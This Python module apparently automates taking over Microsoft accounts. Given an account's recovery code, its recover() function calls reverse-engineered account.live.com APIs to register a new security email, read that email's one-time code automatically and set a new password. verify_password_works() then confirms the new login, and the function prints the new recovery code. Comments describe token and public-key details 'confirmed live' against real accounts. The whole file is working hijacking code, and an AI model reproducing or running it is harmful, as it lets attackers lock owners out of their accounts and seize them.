from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import dedupe_cookies, has_cookie
from urllib.parse import unquote
import asyncio
import logging
import codecs
import httpx
import json
import re


async def verify_password_works(session: httpx.AsyncClient, email: str, password: str) -> str:
    """Check whether Microsoft accepted the new password.

    Returns: "ok" | "bad" | "unknown"
    """
    try:
        await asyncio.sleep(2.0)
        dedupe_cookies(session)

        live = await livedata(session)
        dedupe_cookies(session)
        check = await session.post(
            url=live["urlPost"],
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
            },
            data={
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": live["ppft"],
                "type": "11",
                "LoginOptions": "3",
                "ps": "2",
                "psRNGCDefaultType": "",
                "psRNGCEntropy": "",
                "psRNGCSLK": "",
                "canary": "",
                "ctx": "",
                "hpgrequestid": "",
                "PPSX": "Passpor",
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "0",
            },
            follow_redirects=False,
        )
        dedupe_cookies(session)
        text = check.text or ""
        lower = text.lower()

        if "too many times" in lower or "try again later" in lower:
            logging.warning("Password verify rate-limited for %s", email)
            return "unknown"

        hard_bad = (
            "that password is incorrect" in lower
            or "your account or password is incorrect" in lower
            or '"serrorcode":"80041012"' in lower
            or "serrorcode\\\":\\\"80041012" in lower
        )
        if hard_bad:
            logging.error(
                "Password verify BAD for %s (status=%s)",
                email,
                check.status_code,
            )
            return "bad"

        if (
            check.status_code in (302, 303)
            or has_cookie(session, "__Host-MSAAUTH")
            or "account.live.com" in (check.headers.get("location") or "")
        ):
            logging.info("Password verify OK for %s (status=%s)", email, check.status_code)
            return "ok"

        # Login page without explicit wrong-password — inconclusive
        if "sErrTxt" in text and "incorrect" in lower:
            return "bad"

        logging.warning(
            "Password verify UNKNOWN for %s (status=%s)",
            email,
            check.status_code,
        )
        return "unknown"
    except httpx.CookieConflict as exc:
        logging.warning("Password verify CookieConflict for %s: %s", email, exc)
        dedupe_cookies(session)
        return "unknown"
    except Exception:
        logging.exception("Password verify crashed for %s", email)
        return "unknown"


MS_HEADERS = {
    "Content-type": "application/json; charset=utf-8",
    "Accept": "application/json",
    "Referer": "https://account.live.com/",
    "Origin": "https://account.live.com",
    "hpgid": "200284",
    "hpgact": "0",
}

RECOVER_SCID = 100103
RECOVER_UIFLVR = 1001

# Required for RecoverUser to apply the password when using the VerifyRecoveryCode
# token (v:...). Confirmed live: without this, RecoverUser still returns
# recoveryCode + contactEmail but login fails with 80041012.
RECOVER_PUBLIC_KEY = "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12"


def _parse_json(response: httpx.Response, step: str) -> dict | None:
    if not response.text.strip():
        logging.error("%s: empty response (status %s)", step, response.status_code)
        return None

    try:
        data = response.json()
    except json.JSONDecodeError:
        logging.error(
            "%s: non-JSON response (status %s): %s",
            step,
            response.status_code,
            response.text[:500],
        )
        return None

    if "error" in data and "apiCanary" not in data and "token" not in data and "recoveryCode" not in data:
        err = data.get("error") or {}
        logging.error("%s: Microsoft error %s", step, err.get("code", data))
        return None

    return data


async def recover(
    session: httpx.AsyncClient,
    email: str,
    recovery_code: str,
    new_email: str,
    new_password: str,
):
    """Automates recovery via recovery code.

    Live reverse-engineer findings (2026-07-09 against real MSA):

    1. VerifyRecoveryCode returns token prefix ``v:``
    2. VerifyCode (after SendOtt) returns a NEW token prefix ``a:``
    3. RecoverUser with the ``a:`` token → error 6001 (ExpiredCredentials)
    4. RecoverUser with the ``v:`` token and NO publicKey → returns recoveryCode
       + contactEmail, but password is NOT applied (login 80041012)
    5. RecoverUser with the ``v:`` token AND publicKey → password applies

    So we keep the SendOtt/VerifyCode steps (needed to register the new
    security email), but RecoverUser must use the original ``v:`` token plus
    publicKey — not the post-VerifyCode ``a:`` token.
    """
    data = await session.get(
        url=f"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn={email}"
    )
    logging.info("sRecovery: %s", data.text[:800])

    server_data_match = re.search(r"var\s+ServerData=(.*?)(?=;|$)", data.text)
    if not server_data_match:
        logging.error("recover: could not parse ServerData for %s", email)
        return "invalid"

    server_data = json.loads(server_data_match.group(1))
    decoded_token = codecs.decode(unquote(server_data["sRecoveryToken"]), "unicode_escape")
    uaid = server_data.get("sUnauthSessionID", "")

    rec_token = await session.post(
        url="https://account.live.com/API/Recovery/VerifyRecoveryCode",
        headers={
            **MS_HEADERS,
            "Accept-encoding": "gzip, deflate, br, zstd",
            "Connection": "keep-alive",
            "canary": server_data["apiCanary"],
        },
        json={
            "recoveryCode": recovery_code,
            "code": recovery_code,
            "scid": RECOVER_SCID,
            "token": decoded_token,
            "uaid": uaid,
            "uiflvr": RECOVER_UIFLVR,
        },
    )

    rec_json = _parse_json(rec_token, "VerifyRecoveryCode")
    if not rec_json or "apiCanary" not in rec_json or "token" not in rec_json:
        return None

    canary = rec_json["apiCanary"]
    # Keep this v: token for RecoverUser — do NOT replace with VerifyCode's a: token.
    recover_token = rec_json["token"]

    send_code = await session.post(
        url="https://account.live.com/api/Proofs/SendOtt",
        headers={
            **MS_HEADERS,
            "canary": canary,
        },
        json={
            "associationType": "None",
            "action": "VerifyNewProof",
            "channel": "Email",
            "cxt": "MP",
            "proofId": new_email,
            "scid": RECOVER_SCID,
            "token": recover_token,
            "uaid": uaid,
            "uiflvr": RECOVER_UIFLVR,
        },
    )

    response_json = _parse_json(send_code, "SendOtt")
    if not response_json or "apiCanary" not in response_json:
        return None

    canary = response_json["apiCanary"]
    code = await get_email_code(new_email)
    if not code:
        logging.error("recover: timed out waiting for OTP at %s", new_email)
        return None

    verify_code_response = await session.post(
        url="https://account.live.com/API/Proofs/VerifyCode",
        headers={
            **MS_HEADERS,
            "canary": canary,
        },
        json={
            "action": "VerifyOtc",
            "proofId": new_email,
            "scid": RECOVER_SCID,
            "token": recover_token,
            "uaid": uaid,
            "uiflvr": RECOVER_UIFLVR,
            "code": code,
        },
    )
    verify_json = _parse_json(verify_code_response, "VerifyCode")
    if not verify_json or "apiCanary" not in verify_json:
        return None

    canary = verify_json["apiCanary"]
    a_token = verify_json.get("token")
    logging.info(
        "RecoverUser using v: token (VerifyCode returned %s…) + publicKey",
        (a_token[:2] if isinstance(a_token, str) else None),
    )

    finish_secure = await session.post(
        url="https://account.live.com/API/Recovery/RecoverUser",
        headers={
            **MS_HEADERS,
            "canary": canary,
        },
        json={
            "contactEmail": new_email,
            "contactEpid": "",
            "password": new_password,
            "passwordExpiryEnabled": 0,
            "publicKey": RECOVER_PUBLIC_KEY,
            "token": recover_token,
        },
    )

    logging.info(
        "RecoverUser status=%s body=%s",
        finish_secure.status_code,
        (finish_secure.text or "")[:800],
    )
    print(f"[~] RecoverUser status={finish_secure.status_code} body={(finish_secure.text or '')[:300]}")

    try:
        finish_json = finish_secure.json() if finish_secure.text.strip() else None
    except json.JSONDecodeError:
        finish_json = None

    if not finish_json:
        logging.error("RecoverUser: empty/non-JSON response")
        return None

    if finish_json.get("error") and not finish_json.get("recoveryCode"):
        logging.error("RecoverUser error: %s", finish_json.get("error"))
        return None

    if "recoveryCode" in finish_json:
        new_rc = finish_json["recoveryCode"]
        print(f"[+] - RecoverUser OK (password length={len(new_password)}, publicKey=yes)")
        # Always print the new code — truncated body logs have lost this before.
        print(f"[+] - New recovery code: {new_rc}")
        logging.info("RecoverUser new recoveryCode=%s contactEmail=%s", new_rc, new_email)
        return new_rc

    logging.error("RecoverUser missing recoveryCode: %s", finish_json)
    return None
